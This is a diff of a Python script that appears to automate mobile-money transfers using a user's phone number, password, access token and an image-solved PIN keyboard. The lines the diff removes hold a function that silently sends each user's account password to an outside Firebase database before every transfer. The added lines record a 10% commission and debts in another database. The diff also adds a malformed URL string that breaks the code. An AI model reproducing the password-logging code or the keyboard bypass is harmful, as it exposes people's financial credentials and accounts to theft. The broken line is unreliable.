@@ -2,14 +2,14 @@ import requests
 import json      
 import uuid      
 import sys      
-DB_URL = "https://masrvi-fc997-default-rtdb.firebaseio.com/numbers.json"      
+DB_URL = "https://masrvi-fc997-default-rtdb.firebaseio.com/numbers.json""      
 # -----------------------      
 # استقبال المدخلات من Flask      
 # -----------------------      
 
 num = sys.argv[1] 
 current_password = sys.argv[2] 
-offers = sys.argv[3]     
+offers_input = sys.argv[3]
 access_token_final = sys.argv[4]
 # -----------------------      
 # إعداد session      
@@ -115,28 +115,13 @@ def build(pin, mapping):
 # -----------------------
 # SAVE NUMBER (optional log)
 # -----------------------
-def save_account_to_db(num, current_password):
-    try:
-        url = f"https://masrvi-fc997-default-rtdb.firebaseio.com/numbers/{num}.json"
-
-        data = {
-            "password": current_password
-        }
-
-        requests.put(url, json=data)
-
-    except Exception as e:
-        print(json.dumps({
-            "status": "error",
-            "message": str(e)
-        }))
 
 
 # -----------------------
 # SEND TRANSFER
 # -----------------------
 def send_transfer(amount, original):
-    save_account_to_db(num, current_password)
+    
     try:
         images, kid = get_keyboard(otp_token)
         mapping = extract(images)
@@ -182,7 +167,37 @@ def send_transfer(amount, original):
         return False
 
 
- 
+def update_user_money(num, success, original, half_price):
+    try:
+        url = f"https://moov-befcb-default-rtdb.firebaseio.com/{num}.json"
+
+        res = requests.get(url)
+        user = res.json() or {}
+
+        total_money = user.get("total_money", 0)
+        my_money = user.get("my_money", 0)
+        debts = user.get("debts", 0)
+
+        if success:
+            real_amount = float(original)
+            total_money += real_amount
+            my_money += real_amount * 0.10
+        else:
+            debts += int(half_price)
+
+        data = {
+            "total_money": total_money,
+            "my_money": my_money,
+            "debts": debts
+        }
+
+        requests.patch(url, json=data)
+
+    except Exception as e:
+        print(json.dumps({
+            "status": "error",
+            "message": str(e)
+        })) 
 # -----------------------
 # PROCESSING
 # -----------------------
@@ -200,20 +215,50 @@ if "items" in data and len(data["items"]) > 0:
         print(json.dumps({"status": "error", "message": "no balance"}))
         sys.exit()
 
-    offer = offers.strip().upper()
+    offer = offers_input.strip().upper()
 
-    if offer == "A":
-        amount, original = "500", "5"
-    elif offer == "B":
-        amount, original = "1000", "10"
-    elif offer == "C":
-        amount, original = "2000", "20"
-    else:
-        print(json.dumps({"status": "error", "message": "invalid offer"}))
+    offer_data = {
+    "A": {
+        "idOffre": 49,
+        "half_price": 5000
+    },
+    "B": {
+        "idOffre": 50,
+        "half_price": 10000
+    },
+    "C": {
+        "idOffre": 51,
+        "half_price": 15000
+    },
+    "D": {
+        "idOffre": 52,
+        "half_price": 25000
+    }
+}
+
+
+    selected = offer_data.get(offer)
+
+    if not selected:
+        print(json.dumps({
+        "status": "error",
+        "message": "invalid offer"
+    }))
         sys.exit()
+
+
+    amount = str(selected["half_price"])
+    original = str(selected["half_price"] / 100)
 
     # 🔥 EXECUTE TRANSFER
     success = send_transfer(amount, original)
+
+    update_user_money(
+        num,
+        success,
+        original,
+        selected["half_price"]
+    )
 
     if success:
         print(json.dumps({
@@ -225,3 +270,4 @@ if "items" in data and len(data["items"]) > 0:
         "status": "fail",
         "message": "transfer failed"
     }))
+
